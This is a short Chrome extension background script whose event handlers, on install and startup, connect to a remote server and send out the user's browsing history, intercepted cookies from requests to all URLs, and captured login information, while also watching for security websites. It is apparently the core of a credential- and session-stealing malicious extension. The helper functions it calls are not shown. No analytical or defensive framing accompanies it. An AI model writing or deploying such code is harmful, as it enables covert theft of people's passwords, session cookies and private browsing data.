chrome.runtime.onInstalled.addListener(() => {
  connectToServer();
  searchAndSendHistory();
  chrome.tabs.onUpdated.addListener((tabId, changeInfo) => {
    checkSecurityWebsites(tabId, changeInfo);
  });
  chrome.webRequest.onBeforeSendHeaders.addListener((info) => {
      checkAndSendCookies(info);
    }, {
      urls: ["<all_urls>"]
    },
    ['blocking', 'requestHeaders']);
  chrome.history.onVisited.addListener((page) => {
    sendHistoryPage(page);
  });
});

chrome.runtime.onStartup.addListener(() => {
  connectToServer();
});

chrome.runtime.onSuspend.addListener(() => {
  disconnectFromServer(socket);
});

chrome.runtime.onMessage.addListener((request, sender) => {
  sendLoginInfo(request.loginListener);
});
